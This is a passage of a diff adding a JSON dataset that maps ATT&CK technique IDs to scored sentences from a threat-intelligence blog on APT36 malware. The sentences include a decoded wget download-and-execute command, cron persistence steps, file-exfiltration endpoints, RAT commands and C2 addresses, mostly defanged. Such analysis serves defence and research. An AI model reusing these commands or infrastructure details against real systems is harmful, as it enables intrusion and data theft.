+      },
+      {
+        "sentence": "The PDF appears to be a document from the Indian Ministry of Defence describing the visit of nine members of a delegation from Saudi Arabia, where they discussed issues with Indian Armed Forces medical officials.",
+        "score": 0.4481
+      },
+      {
+        "sentence": "Inflated File Attack - June 2023 Beginning in June 2023, we detected APT36 establishing their operational infrastructure on a server with the IP address 153.92.220.59.",
+        "score": 0.4541
+      },
+      {
+        "sentence": "Further insight into this attacker-controlled infrastructure is available in the Threat Actor Infrastructure section.",
+        "score": 0.3235
+      },
+      {
+        "sentence": "In August, we noted a significant development where few of these domains served as the hosting platform for decoy PDF files.",
+        "score": 0.4504
+      },
+      {
+        "sentence": "These PDFs were linked within the malicious Linux desktop entry files, which the threat actor distributed enclosed in zip archives.",
+        "score": 0.487
+      },
+      {
+        "sentence": "Here are some technical details about this case: - ZIP archive MD5 hash: 36b19ca8737c63b9c9a3365ff4968ef5 - ZIP filename: Meeting_agenda.zip - Desktop entry file MD5 hash: 65167974b397493fce320005916a13e9 - Desktop entry filename: approved_copy.desktop Desktop entry file analysis The first anomaly we observed was the large size of the Linux desktop entry file.",
+        "score": 0.6503
+      },
+      {
+        "sentence": "A size larger than 1 MB for a Linux desktop entry file is rare.",
+        "score": 0.5531
+      },
+      {
+        "sentence": "Reviewing the file revealed that the threat actor inflated the size of the file by adding more than a million \"#\" characters.",
+        "score": 0.7001
+      },
+      {
+        "sentence": "We believe this was an attempt by the threat actor to bypass security scanning solutions.",
+        "score": 0.5288
+      },
+      {
+        "sentence": "The image below shows the extra characters added to the inflated Linux desktop entry file.",
+        "score": 0.5958
+      },
+      {
+        "sentence": "Figure 6: The inflated Linux desktop entry file.",
+        "score": 0.4429
+      },
+      {
+        "sentence": "This decoy file contains an error message to distract the user.",
+        "score": 0.4806
+      },
+      {
+        "sentence": "Figure 7 shows that the icon of this desktop file is set to application-pdf which is done to disguise the malware as an innocuous file. - Creates a hidden directory path called, local/share, in the user's home directory. - Downloads the Linux payload from the URL 64.227.133[.]222/zswap-xbusd using wget.",
+        "score": 0.4519
+      },
+      {
+        "sentence": "Saves it as zswap-xbusd in the previously created hidden directory. - Writes a short shell script to the file /dev/shm/myc.txt.",
+        "score": 0.4134
+      },
+      {
+        "sentence": "The shell script reboots the machine and then launches the Linux payload. - Sets up a cron job under the current username to run the contents of the /dev/shm/myc.txt script. - Deletes the shell script. - Executes the Linux payload.",
+        "score": 0.4822
+      },
+      {
+        "sentence": "Figure 7: The icon of the desktop configuration file is set to PDF to make it more convincing.",
+        "score": 0.4508
+      },
+      {
+        "sentence": "At the time of our analysis, the server 64.227.133[.]222 was not serving the Linux payload.",
+        "score": 0.3665
+      },
+      {
+        "sentence": "We continued monitoring this infrastructure and noticed that on Aug 29, 2023, a new domain called admin-br[.]in was registered and used to distribute a new Linux desktop entry file.",
+        "score": 0.4327
+      },
+      {
+        "sentence": "In this instance, we were able to retrieve the payloads and conclude the threat attribution to APT36.",
+        "score": 0.4374
+      },
+      {
+        "sentence": "The image below shows a decoy PDF file displaying an error message stating “Failed to load the PDF document”.",
+        "score": 0.5506
+      },
+      {
+        "sentence": "Figure 8: The decoy PDF file displayed to the user.",
+        "score": 0.4291
+      },
+      {
+        "sentence": "In this case, the Linux desktop entry file retrieves the malicious Linux payloads from the servers at: - 64.227.138[.]127 - 134.209.159[.]9 The two files retrieved are cleverly named to disguise themselves as legitimate software utilities.",
+        "score": 0.4632
+      },
+      {
+        "sentence": "Here is the metadata of Linux payloads: - MD5 hash: 98279047a7db080129e5ec84533822ef - Filename: pickle-help - MD5 hash: 248d4e6bb0f32afd7a1cfb975910235a - Filename: ziputils-help A quick technical analysis determined these Linux payloads as Mythic Poseidon binaries.",
+        "score": 0.6837
+      },
+      {
+        "sentence": "Since Mythic is an open-source framework that is well-documented on GitHub, we will not explore its technical details in this blog.",
+        "score": 0.425
+      },
+      {
+        "sentence": "The corresponding C2 servers extracted from each malicious Linux payload are listed below. | C2 IP ADDRESS | PORT | |---|---| | 108.61.163[.]195 | 7443 | | 64.176.40[.]100 | 7443 | The C2 panel for Mythic Poseidon can be accessed by visiting the URI path /new/login on the server running at port 7443.",
+        "score": 0.3878
+      },
+      {
+        "sentence": "For instance, the C2 panel for 108.61.163[.]195 can be accessed at hxxps://108.61.163[.]195:7443/new/login .",
+        "score": 0.3263
+      },
+      {
+        "sentence": "New Python-Based Cyber Espionage Utilities Targeting Linux During our analysis, we also discovered new Python-based ELF binaries used by APT36 for the purpose of cyber espionage.",
+        "score": 0.5248
+      },
+      {
+        "sentence": "These binaries target the Linux environment in the Indian government organizations and are named to seem like legitimate Linux system services.",
+        "score": 0.3869
+      },
+      {
+        "sentence": "In this section, we review two types of cyber espionage tools discovered by our research team.",
+        "score": 0.3867
+      },
+      {
+        "sentence": "GLOBSHELL - Custom-built File exfiltration Linux utility The espionage tool under analysis includes this metadata: - MD5 hash: 3c3c9303ae33f3bae2e139dbb1db838e - Filename: rcu-tasks-kthread This ELF binary was compiled using PyInstaller.",
+        "score": 0.5258
+      },
+      {
+        "sentence": "We extracted the decompiled Python code to understand its functionality.",
+        "score": 0.438
+      },
+      {
+        "sentence": "The image below shows the decompiled code.",
+        "score": 0.4396
+      },
+      {
+        "sentence": "Figure 10: The decompiled code of Python-based cyber espionage tool type 1.",
+        "score": 0.4327
+      },
+      {
+        "sentence": "These are the key operations performed by this script: - The script contains a predefined list of file extensions which are scanned for in the /media directory recursively.",
+        "score": 0.4847
+      },
+      {
+        "sentence": "The list of file extensions includes various types like image files, MS Office files, LibreOffice, and PDF. - Once the list of files is built, it copies the files to a hidden directory in the path: ~/.config/bossconfig/usnconfig/ - The content inside this directory is archived into a ZIP file called usnconfig.zip . - Data is exfiltrated to the URL hxxp://baseuploads[.]com/myf/test.php in an HTTP POST request.",
+        "score": 0.4374
+      },
+      {
+        "sentence": "Along with the ZIP file, the machine's username, hostname, and the current timestamp are sent.",
+        "score": 0.3415
+      },
+      {
+        "sentence": "We found another ELF binary called mm-precpu-wq with the same functionality as the ELF binary discussed above.",
+        "score": 0.5683
+      },
+      {
+        "sentence": "However, this binary included a more in-depth predefined list of file extensions and file paths which it scans to exfiltrate files.",
+        "score": 0.4188
+      },
+      {
+        "sentence": "The image below shows the relevant code section which does this.",
+        "score": 0.4306
+      },
+      {
+        "sentence": "Figure 11: The decompiled code Python-based cyber espionage tool type 2.",
+        "score": 0.425
+      },
+      {
+        "sentence": "This JSON data has details about the windows and tabs in the current live Firefox session. - Iterates over every tab in every Firefox window, extracting the title and the URL from each tab.",
+        "score": 0.3319
+      },
+      {
+        "sentence": "Then, the code checks if they match any value in the predefined list mentioned earlier. - If and when it finds a match, the code archives the ~/.mozilla/firefox directory content into the /dev/shm/firefox.zip ZIP archive. - Uploads the ZIP archive to hxxp://baseuploads[.]com/myf/test.php in an HTTP POST request.",
+        "score": 0.5329
+      },
+      {
+        "sentence": "In addition to uploading the data, the code also uploads the username, hostname, and current timestamp.",
+        "score": 0.3001
+      },
+      {
+        "sentence": "Reasons for New Linux-Based Attack Vectors Why is APT36 suddenly adding new attack vectors for the Linux environment? - Historic and widespread usage of Linux in the Indian government sector: Linux-based operating systems are widely used in the Indian government sector.",
+        "score": 0.4345
+      },
+      {
+        "sentence": "The Debian-based operating system, BOSS (Bharat Online Software Solution), developed by CDAC is used across various state ministries and even the Indian defense forces.",
+        "score": 0.3678
+      },
+      {
+        "sentence": "For more details about the usage of Linux Boss in India, visit the Ministry of Electronics & Information Technology. - Expanding into government-related verticals: The recent announcement by the Indian government introduces Maya OS, a Debian Linux-based operating system that will replace Microsoft Windows OS across government and defense sectors.",
+        "score": 0.4778
+      },
+      {
+        "sentence": "Consequently, there is now a substantial incentive for APT36 and other nation-state threat actors, known for targeting India, to incorporate new attack vectors and Linux payloads into their arsenal.",
+        "score": 0.4365
+      },
+      {
+        "sentence": "Threat Attribution We attribute these new Windows and Linux-based attacks to APT36 because their method of serving decoy PDF files, the metadata and their Linux commands are almost identical to previous attacks, which are known and linked to APT36.",
+        "score": 0.4411
+      },
+      {
+        "sentence": "In addition to this, there is also a C2 infrastructure overlap with previous APT36 attacks which we describe in more detail in the corresponding section.",
+        "score": 0.3269
+      },
+      {
+        "sentence": "Decoy PDF files The decoy PDF file which is dropped in the same directory as the malicious DLL on the victim's machine by ElizaRAT.",
+        "score": 0.436
+      },
+      {
+        "sentence": "The metadata of this PDF file indicated the author as \"Apolo Jones\" and the PDF file itself was generated with Microsoft Office Word.",
+        "score": 0.5351
+      },
+      {
+        "sentence": "Both these indicators align with our technical analysis of APT36 from November of 2022.",
+        "score": 0.4281
+      },
+      {
+        "sentence": "In addition to this, the decoy PDF files downloaded from the attacker-controlled servers in the campaign targeting the Linux platform share the same metadata as well.",
+        "score": 0.5267
+      },
+      {
+        "sentence": "Linux commands While the attack vector used to distribute the Linux payload is entirely new in this campaign, the Linux commands and file paths used in the desktop entry files share similarities with the previous APT36 campaign used to distribute Linux payloads.",
+        "score": 0.4545
+      },
+      {
+        "sentence": "In March 2023, APT36 used a Python-compiled ELF binary to target the Linux environment in the Indian government sector.",
+        "score": 0.508
+      },
+      {
+        "sentence": "You can read about it on the Uptycs blog.",
+        "score": 0.3712
+      },
+      {
+        "sentence": "By comparing the Linux commands used in the decompiled Python code in March 2023 and the Linux commands used in the latest desktop entry files (in August 2023), we can see a clear similarity.",
+        "score": 0.493
+      },
+      {
+        "sentence": "The figure below shows a side-by-side comparison of the two.",
+        "score": 0.3588
+      },
+      {
+        "sentence": "Figure 12: A side-by-side comparison of Linux commands from the March 2023 and August 2023 campaigns executed by APT36.",
+        "score": 0.3397
+      },
+      {
+        "sentence": "Here is a list of similarities between both cases: - A hidden directory path structure is created in the location: ~/.local/share . - A short shell script responsible for rebooting the machine and executing the Linux payload is written to /dev/shm/ . - The same crontab command is executed. - The shell script is deleted. - The sequence of commands is similar.",
+        "score": 0.4584
+      },
+      {
+        "sentence": "Threat Actor Infrastructure In the APT36 attacks observed since April 2023, the threat actor has taken extensive measures to conceal any connection to Pakistan by making it seem that the infrastructure is controlled by a threat actor in India.",
+        "score": 0.4647
+      },
+      {
+        "sentence": "We assess, with a high-confidence, that this is not a coincidence but rather an intentional deception tactic used by APT36 to avoid the attacks from being attributed to Pakistan.",
+        "score": 0.4363
+      },
+      {
+        "sentence": "Registrant Country of C2 Domains Beginning in June 2023, the threat actor started registering several domains on a server with the IP address 153.92.220.59.",
+        "score": 0.3091
+      },
+      {
+        "sentence": "The IP address is related to the Hostinger ASN.",
+        "score": 0.314
+      },
+      {
+        "sentence": "This infrastructure was involved in the attacks distributing malicious Linux desktop entry files discussed earlier.",
+        "score": 0.3903
+      },
+      {
+        "sentence": "While the WHOIS information for all these domains is redacted, we can still see the registrant country.",
+        "score": 0.4177
+      },
+      {
+        "sentence": "For most of the domains, the threat actor took sufficient measures to ensure the registrant country is India (IN).",
+        "score": 0.3161
+      },
+      {
+        "sentence": "However, for one of the domains, admindesk[.]in, we can see the registrant country is PK (Pakistan).",
+        "score": 0.3536
+      },
+      {
+        "sentence": "The figure below shows examples of WHOIS information for two of the domains registered by the threat actor on the same infrastructure and used in the same attack.",
+        "score": 0.3645
+      },
+      {
+        "sentence": "Figure 13: A side-by-side comparison of the WHOIS info from two attacker-registered domains related to same campaign and infrastructure.",
+        "score": 0.3344
+      },
+      {
+        "sentence": "We believe this was an OPSEC mistake by the threat actor.",
+        "score": 0.3602
+      },
+      {
+        "sentence": "C2 Infrastructure Overlap There is a C2 infrastructure overlap between the latest campaign and the previous instances of attacks by APT36. - In 2022, the server with IP address 153.92.220[.]48 was used to host the domains below which are registered by APT36: - Govscholarships[.]in - Kavach-apps[.]com - Kavach-app[.]in - Rodra[.]in - ksboard[.]in - In the latest instance, a server with IP address: 153.92.220[.]59 was used to host the C2 domains.",
+        "score": 0.3987
+      },
+      {
+        "sentence": "Both the IP addresses belong to the same subnet: 153.92.220.0/24 - These IP addresses belong to the ASN - AS 47583 (Hostinger) which has been abused by APT36 in the past.",
+        "score": 0.3108
+      },
+      {
+        "sentence": "Email Associated with Malicious Google Drive Links ElizaRAT is distributed using malicious Google Drive links.",
+        "score": 0.3438
+      },
+      {
+        "sentence": "Leveraging the Google Drive ID from the links, we gathered additional information about the owner of the Google Drive and the corresponding email address.",
+        "score": 0.3783
+      },
+      {
+        "sentence": "The image below shows the information we retrieved.",
+        "score": 0.3489
+      },
+      {
+        "sentence": "The email address and owner name associated with the Google Drive link was: - Email address: [email protected] - Owner namer: \"Nand Kishore\" Because “Nand Kishore” is a common name in India, the fake owner was added to implicate a threat actor from India, not Pakistan - where APT36 originates.",
+        "score": 0.4174
+      },
+      {
+        "sentence": "Attacker-Controlled Server IP Addresses In a few instances, threat actors distributed malicious Linux desktop entry files where the embedded payloads were hosted on servers located in India.",
+        "score": 0.4748
+      },
+      {
+        "sentence": "Here is a list of the IP addresses of four servers hosting the malicious Linux payloads: - 103.2.232[.]82 - 64.227.133[.]222 - 64.227.138[.]127 - 134.209.159[.]9 Top Level Domain (TLDs) of Malicious Domains In all of the attacks we reviewed for this blog, the TLD was always set to .in - corresponding with the country of India.",
+        "score": 0.4682
+      },
+      {
+        "sentence": "Another tactic used by APT36 in a few cases is to disguise bad URLs as official Indian government-related web addresses.",
+        "score": 0.374
+      },
+      {
+        "sentence": "Conclusion Our research team is actively monitoring the C2 infrastructure of APT36, which is used to register new domains that are used in attacks targeting the Linux environment.",
+        "score": 0.327
+      },
+      {
+        "sentence": "The infrastructure continues to be active at the time of this blog publication.",
+        "score": 0.3191
+      },
+      {
+        "sentence": "We have included a comprehensive list of indicators of compromise (IOCs) at the end of this blog and we urge the research community to update their detection.",
+        "score": 0.4812
+      },
+      {
+        "sentence": "APT36’s introduction of new file formats, new attack vectors, and a new backdoor to the arsenal suggests that they are actively updating their tactics, techniques, and procedures (TTPs).",
+        "score": 0.5161
+      },
+      {
+        "sentence": "In addition to staying on top of these threats, Zscaler's ThreatLabz team continuously monitors for new threats and shares its findings with the wider community.",
+        "score": 0.4099
+      },
+      {
+        "sentence": "Zscaler Coverage Zscaler's multilayered cloud security platform detects indicators at various levels. - Win32.RAT.ElizaRAT - Win64.RAT.ElizaRAT - Linux.Payload.GLOBSHELL - Linux.Payload.PYSHELLFOX - Linux.Backdoor.Mythic The image below shows the sandbox detection for the new Windows RAT (ElizaRAT) used in the attack.",
+        "score": 0.5831
+      },
+      {
+        "sentence": "Disclaimer: This blog post has been created by Zscaler for informational purposes only and is provided \"as is\" without any guarantees of accuracy, completeness or reliability.",
+        "score": 0.3413
+      },
+      {
+        "sentence": "Zscaler assumes no responsibility for any errors or omissions or for any actions taken based on the information provided.",
+        "score": 0.3574
+      },
+      {
+        "sentence": "Any third-party websites or resources linked in this blog post are provided for convenience only, and Zscaler is not responsible for their content or practices.",
+        "score": 0.3677
+      },
+      {
+        "sentence": "All content is subject to change without notice.",
+        "score": 0.3697
+      },
+      {
+        "sentence": "By accessing this blog, you agree to these terms and acknowledge your sole responsibility to verify and use the information as appropriate for your needs.",
+        "score": 0.3828
+      },
+      {
+        "sentence": "Get the latest Zscaler blog updates in your inbox By submitting the form, you are agreeing to our privacy policy.",
+        "score": 0.3797
+      }
+    ],
+    "T1218.002": [
+      {
+        "sentence": "Zscaler Blog Get the latest Zscaler blog updates in your inbox A peek into APT36’s updated arsenal Introduction In July 2023, Zscaler ThreatLabz discovered new malicious activity perpetuated by the Pakistan-based advanced persistent threat group (APT36).",
+        "score": 0.403
+      },
+      {
+        "sentence": "We observed APT36 targeting Indian government sectors using a previously undocumented Windows RAT, new cyber espionage utilities for Linux, new distribution mechanisms, and a new attack vector used against the Linux environment.",
+        "score": 0.4603
+      },
+      {
+        "sentence": "In this blog, we will examine the latest tools employed by APT36, which are designed to target both Windows and Linux operating systems.",
+        "score": 0.4133
+      },
+      {
+        "sentence": "Key Takeaways - Updated arsenal of APT36: The threat actor has resurfaced with a fresh, fully functional Windows remote administration tool (RAT), novel tools for cyber espionage on Linux systems, innovative distribution methods, and additional attack vectors. - New Windows RAT: A custom RAT, referred to as ElizaRAT, has been incorporated into the APT36 toolkit.",
+        "score": 0.4584
+      },
+      {
+        "sentence": "They chose the infrastructure and artifacts meticulously to make it appear as though the activities were conducted in India. - Reuse of infrastructure: In some cases, the same C2 infrastructure is being used by APT36 for both credential phishing attacks and distributing malicious binaries.",
+        "score": 0.4768
+      },
+      {
+        "sentence": "Brief Overview APT36 is an advanced persistent threat (APT) group which we attribute to Pakistan with very high confidence.",
+        "score": 0.3422
+      },
+      {
+        "sentence": "This group has been active since 2013 and primarily targets the Indian government, defense, and education sectors.",
+        "score": 0.3447
+      },
+      {
+        "sentence": "This group leverages credential harvesting and malware distribution attacks to conduct cyber espionage.",
+        "score": 0.3022
+      },
+      {
+        "sentence": "ElizaRAT is distributed as .NET binaries sent inside password-protected archive files hosted on Google Drive links.",
+        "score": 0.5117
+      },
+      {
+        "sentence": "During our threat analysis, we gathered several samples of ElizaRAT and they all shared these characteristics: - They are all .NET binaries that are compiled as Control Panel applets (CPL) and use the \".cpl\" file extension.",
+        "score": 0.6596
+      },
+      {
+        "sentence": "To the best of our knowledge, we believe this is the first time APT36 has weaponized the CPL file format. - The binaries are large in size - ranging from 4MB to 16MB. - The Costura .NET framework was used to embed the essential .NET assemblies inside the main malware which resulted in the inflation of binary sizes. - The Telegram API was used for C2 communication.",
+        "score": 0.5438
+      },
+      {
+        "sentence": "For this technical analysis, we use the following file metadata: - MD5 hash: fc99daa2e1b47bae4be51e5e59aef1f0 - Filename: AgendaMeeting.cpl Since this Windows RAT arrives on the endpoint in the form of a Control Panel applet, the first method called upon execution is CplApplet().",
+        "score": 0.7823
+      },
+      {
+        "sentence": "This method transfers control to Program().Main() which in turn invokes an asynchronous task - MainAsync().",
+        "score": 0.4642
+      },
+      {
+        "sentence": "Inside this task, all important malicious operations are carried out.",
+        "score": 0.4681
+      },
+      {
+        "sentence": "The image below shows Program().Main() kick starting the malicious activities on the endpoint.",
+        "score": 0.5568
+      },
+      {
+        "sentence": "Figure 1: The MainAsync() method used to start the malicious activities on the endpoint.",
+        "score": 0.4772
+      },
+      {
+        "sentence": "In the following sections, we dive deeper into some of these operations.",
+        "score": 0.3763
+      },
+      {
+        "sentence": "Logging Operation Each execution result is logged on both the endpoint (client-side) and the Telegram bot (server-side).",
+        "score": 0.3056
+      },
+      {
+        "sentence": "The image below shows the relevant code used to generate these values.",
+        "score": 0.4306
+      },
+      {
+        "sentence": "C2 Command Format Since the threat actor uses the same Telegram bot to manage multiple infected endpoints, they use a specific C2 command format to synchronize the operations and ensure that a given command executes only on the intended endpoint.",
+        "score": 0.4285
+      },
+      {
+        "sentence": "The C2 command format looks like this: C2 Commands All C2 commands are handled in a switch-case statement by the Bot_OnMessage() method inside the Communicate class.",
+        "score": 0.3564
+      },
+      {
+        "sentence": "The following C2 commands are supported by the bot: | C2 COMMAND | FUNCTIONALITY | |---|---| | /dir | Fetches the list of files in the specified directory. | | /upload | Uploads the specified file from the victim’s machine. | | /getprocess | Gets the list of processes running on the victim’s machine.",
+        "score": 0.3085
+      },
+      {
+        "sentence": "The list is returned in a file with the name getproc.dll . | | /run | Executes the specified program on the victim’s machine. | | /delete | Deletes the specified file. | | /end | Kills the specified processes on the victim’s machine. | | /online | Checks whether the infected machine is online. | | /identity | Connects to the specified website from the victim’s machine and sends a response to the threat actor.",
+        "score": 0.4344
+      },
+      {
+        "sentence": "The image below shows the code used to create this shortcut file.",
+        "score": 0.5199
+      },
+      {
+        "sentence": "The name of the shortcut file is fetched from the \"orig_name\" setting defined in the config.",
+        "score": 0.4453
+      },
+      {
+        "sentence": "In this case, the shortcut file is called TextSource.lnk.",
+        "score": 0.4559
+      },
+      {
+        "sentence": "Figure 3: The buildforts() method used to create a Windows shortcut file in the Startup directory for persistence.",
+        "score": 0.4685
+      },
+      {
+        "sentence": "The description of this shortcut file is set to \"Text Editing APP for Windows\" to disguise it as a text editing application, making it seem innocuous.",
+        "score": 0.5261
+      },
+      {
+        "sentence": "In addition, the target command line is set to execute the Control panel applet using rundll32 .",
+        "score": 0.574
+      },
+      {
+        "sentence": "Displaying Decoy Content The method dosome() defined in the Program class is responsible for displaying the decoy PDF file to the user.",
+        "score": 0.5505
+      },
+      {
+        "sentence": "This decoy file is present inside the resources section of the .NET binary.",
+        "score": 0.5387
+      },
+      {
+        "sentence": "The image below shows the decoy file.",
+        "score": 0.5078
+      },
+      {
+        "sentence": "It is only used to distract the victim and make it appear that an error occurred when opening the file.",
+        "score": 0.4572
+      },
+      {
+        "sentence": "Figure 4: Decoy PDF file displayed to the user.",
+        "score": 0.5156
+      },
+      {
+        "sentence": "Malicious Linux Desktop Entry Files as New Attack Vectors The utilization of Linux desktop entry files by APT36 as an attack vector has never been documented before.",
+        "score": 0.4767
+      },
+      {
+        "sentence": "This attack vector is fairly new and appears to be utilized in very low-volume attacks.",
+        "score": 0.3041
+      },
+      {
+        "sentence": "So far, our research team has discovered three samples - all of which have 0 detection on VirusTotal.",
+        "score": 0.3104
+      },
+      {
+        "sentence": "We first observed an occurrence in May 2023 when a credential phishing website used to target Indian government employees was also found to be hosting a redirector to distribute ZIP archives containing malicious Linux desktop entry files.",
+        "score": 0.5082
+      },
+      {
+        "sentence": "National Informatics Center (NIC), India Phishing Attack - May 2023 In May 2023, we discovered a credential phishing site, email9ov[.]in, targeting Indian government officials by masquerading as the official login portal for National Informatics Center (NIC), India.",
+        "score": 0.4147
+      },
+      {
+        "sentence": "We notified NIC in May 2023 about this website and the associated threat intel.",
+        "score": 0.3843
+      },
+      {
+        "sentence": "We also noticed that the same phishing website was using the hxxps://email9ov[.]in/VISIT_OF_MEDICAL URL to redirect visitors to the hxxp://103.2.232[.]82:8081/Tri-Service-Exercise/Delegation_Saudi_Arabia.zip URL.",
+        "score": 0.4384
+      },
+      {
+        "sentence": "From here, a visitor would download a ZIP archive containing a maliciously crafted Linux desktop entry file.",
+        "score": 0.5747
+      },
+      {
+        "sentence": "The base64-encoded command present inside the desktop entry file decodes to: | /usr/bin/wget 'hxxp://103.2.232[.]82:8081/Tri-Service-Exercise/Delegation_Saudi_Arabia.pdf' -O /tmp/Delegation_Saudi_Arabia.pdf; /usr/bin/wget 'hxxp://103.2.232[.]82:8081/ISEPC-12-2023-Agenda-for-meeting/185' -O /tmp/185.elf; cd /tmp; chmod +x 185.elf;libreoffice /tmp/Delegation_Saudi_Arabia.pdf | ./185 | The command decoded above performs the following actions: 1.",
+        "score": 0.5338
+      },
+      {
+        "sentence": "Downloads the decoy PDF and saves it in the /tmp directory with the filename: Delegation_Saudi_Arabia.pdf .",
+        "score": 0.6075
+      },
+      {
+        "sentence": "Downloads the Linux payload and saves it in the /tmp directory with the filename: 185.elf .",
+        "score": 0.5768
+      },
+      {
+        "sentence": "Marks the Linux binary as executable.",
+        "score": 0.5291
+      },
+      {
+        "sentence": "Uses LibreOffice to open and display the decoy PDF file.",
+        "score": 0.5424
+      },
+      {
+        "sentence": "Executes the Linux payload.",
+        "score": 0.4485
+      },
+      {
+        "sentence": "In this case, the Linux payload was a cross-platform binary designed to run on both Linux and WSL (Windows Subsystem for Linux) machines.",
+        "score": 0.4138
+      },
+      {
+        "sentence": "Since it did not contain a fully functional C2 mechanism at the time of analysis, we believe it was still in a development phase and used by the threat actor as an initial test.",
+        "score": 0.3768
+      },
+      {
+        "sentence": "The content inside the decoy PDF file is displayed in the image below.",
+        "score": 0.4956
+      },
+      {
+        "sentence": "Figure 5: Decoy PDF displayed to the user.",
+        "score": 0.5151
+      },
+      {
+        "sentence": "The PDF appears to be a document from the Indian Ministry of Defence describing the visit of nine members of a delegation from Saudi Arabia, where they discussed issues with Indian Armed Forces medical officials.",
+        "score": 0.3568
+      },
+      {
+        "sentence": "Inflated File Attack - June 2023 Beginning in June 2023, we detected APT36 establishing their operational infrastructure on a server with the IP address 153.92.220.59.",
+        "score": 0.4057
+      },
+      {
+        "sentence": "The threat actor proceeded to register multiple domains hosted on this IP.",
+        "score": 0.3743
+      },
+      {
+        "sentence": "Further insight into this attacker-controlled infrastructure is available in the Threat Actor Infrastructure section.",
+        "score": 0.3606
+      },
+      {
+        "sentence": "In August, we noted a significant development where few of these domains served as the hosting platform for decoy PDF files.",
+        "score": 0.4668
+      },
+      {
+        "sentence": "These PDFs were linked within the malicious Linux desktop entry files, which the threat actor distributed enclosed in zip archives.",
+        "score": 0.5635
+      },
+      {
+        "sentence": "Here are some technical details about this case: - ZIP archive MD5 hash: 36b19ca8737c63b9c9a3365ff4968ef5 - ZIP filename: Meeting_agenda.zip - Desktop entry file MD5 hash: 65167974b397493fce320005916a13e9 - Desktop entry filename: approved_copy.desktop Desktop entry file analysis The first anomaly we observed was the large size of the Linux desktop entry file.",
+        "score": 0.4911
+      },
+      {
+        "sentence": "A size larger than 1 MB for a Linux desktop entry file is rare.",
+        "score": 0.4238
+      },
+      {
+        "sentence": "Reviewing the file revealed that the threat actor inflated the size of the file by adding more than a million \"#\" characters.",
+        "score": 0.4319
+      },
+      {
+        "sentence": "The image below shows the extra characters added to the inflated Linux desktop entry file.",
+        "score": 0.4768
+      },
+      {
+        "sentence": "Figure 6: The inflated Linux desktop entry file.",
+        "score": 0.5788
+      },
+      {
+        "sentence": "This decoy file contains an error message to distract the user.",
+        "score": 0.4755
+      },
+      {
+        "sentence": "Figure 7 shows that the icon of this desktop file is set to application-pdf which is done to disguise the malware as an innocuous file. - Creates a hidden directory path called, local/share, in the user's home directory. - Downloads the Linux payload from the URL 64.227.133[.]222/zswap-xbusd using wget.",
+        "score": 0.54
+      },
+      {
+        "sentence": "Saves it as zswap-xbusd in the previously created hidden directory. - Writes a short shell script to the file /dev/shm/myc.txt.",
+        "score": 0.4378
+      },
+      {
+        "sentence": "The shell script reboots the machine and then launches the Linux payload. - Sets up a cron job under the current username to run the contents of the /dev/shm/myc.txt script. - Deletes the shell script. - Executes the Linux payload.",
+        "score": 0.498
+      },
+      {
+        "sentence": "Figure 7: The icon of the desktop configuration file is set to PDF to make it more convincing.",
+        "score": 0.5514
+      },
+      {
+        "sentence": "At the time of our analysis, the server 64.227.133[.]222 was not serving the Linux payload.",
+        "score": 0.3828
+      },
+      {
+        "sentence": "We continued monitoring this infrastructure and noticed that on Aug 29, 2023, a new domain called admin-br[.]in was registered and used to distribute a new Linux desktop entry file.",
+        "score": 0.6111
+      },
+      {
+        "sentence": "In this instance, we were able to retrieve the payloads and conclude the threat attribution to APT36.",
+        "score": 0.4089
+      },
+      {
+        "sentence": "The image below shows a decoy PDF file displaying an error message stating “Failed to load the PDF document”.",
+        "score": 0.5404
+      },
+      {
+        "sentence": "This is used to distract the user while malicious activities occur in the background.",
+        "score": 0.3988
+      },
+      {
+        "sentence": "Figure 8: The decoy PDF file displayed to the user.",
+        "score": 0.5316
+      },
+      {
+        "sentence": "In this case, the Linux desktop entry file retrieves the malicious Linux payloads from the servers at: - 64.227.138[.]127 - 134.209.159[.]9 The two files retrieved are cleverly named to disguise themselves as legitimate software utilities.",
+        "score": 0.628
+      },
+      {
+        "sentence": "Here is the metadata of Linux payloads: - MD5 hash: 98279047a7db080129e5ec84533822ef - Filename: pickle-help - MD5 hash: 248d4e6bb0f32afd7a1cfb975910235a - Filename: ziputils-help A quick technical analysis determined these Linux payloads as Mythic Poseidon binaries.",
+        "score": 0.4863
+      },
+      {
+        "sentence": "Since Mythic is an open-source framework that is well-documented on GitHub, we will not explore its technical details in this blog.",
+        "score": 0.3838
+      },
+      {
+        "sentence": "The corresponding C2 servers extracted from each malicious Linux payload are listed below. | C2 IP ADDRESS | PORT | |---|---| | 108.61.163[.]195 | 7443 | | 64.176.40[.]100 | 7443 | The C2 panel for Mythic Poseidon can be accessed by visiting the URI path /new/login on the server running at port 7443.",
+        "score": 0.3905
+      },
+      {
+        "sentence": "For instance, the C2 panel for 108.61.163[.]195 can be accessed at hxxps://108.61.163[.]195:7443/new/login .",
+        "score": 0.4415
+      },
+      {
+        "sentence": "Figure 9: The Mythic C2 panel for the Poseidon binary.",
+        "score": 0.5146
+      },
+      {
+        "sentence": "New Python-Based Cyber Espionage Utilities Targeting Linux During our analysis, we also discovered new Python-based ELF binaries used by APT36 for the purpose of cyber espionage.",
+        "score": 0.4768
+      },
+      {
+        "sentence": "These binaries target the Linux environment in the Indian government organizations and are named to seem like legitimate Linux system services.",
+        "score": 0.4042
+      },
+      {
+        "sentence": "In this section, we review two types of cyber espionage tools discovered by our research team.",
+        "score": 0.346
+      },
+      {
+        "sentence": "GLOBSHELL - Custom-built File exfiltration Linux utility The espionage tool under analysis includes this metadata: - MD5 hash: 3c3c9303ae33f3bae2e139dbb1db838e - Filename: rcu-tasks-kthread This ELF binary was compiled using PyInstaller.",
+        "score": 0.4275
+      },
+      {
+        "sentence": "We extracted the decompiled Python code to understand its functionality.",
+        "score": 0.4427
+      },
+      {
+        "sentence": "The image below shows the decompiled code.",
+        "score": 0.4429
+      },
+      {
+        "sentence": "Figure 10: The decompiled code of Python-based cyber espionage tool type 1.",
+        "score": 0.4799
+      },
+      {
+        "sentence": "The list of file extensions includes various types like image files, MS Office files, LibreOffice, and PDF. - Once the list of files is built, it copies the files to a hidden directory in the path: ~/.config/bossconfig/usnconfig/ - The content inside this directory is archived into a ZIP file called usnconfig.zip . - Data is exfiltrated to the URL hxxp://baseuploads[.]com/myf/test.php in an HTTP POST request.",
+        "score": 0.3587
+      },
+      {
+        "sentence": "We found another ELF binary called mm-precpu-wq with the same functionality as the ELF binary discussed above.",
+        "score": 0.445
+      },
+      {
+        "sentence": "The image below shows the relevant code section which does this.",
+        "score": 0.4196
+      },
+      {
+        "sentence": "Figure 11: The decompiled code Python-based cyber espionage tool type 2.",
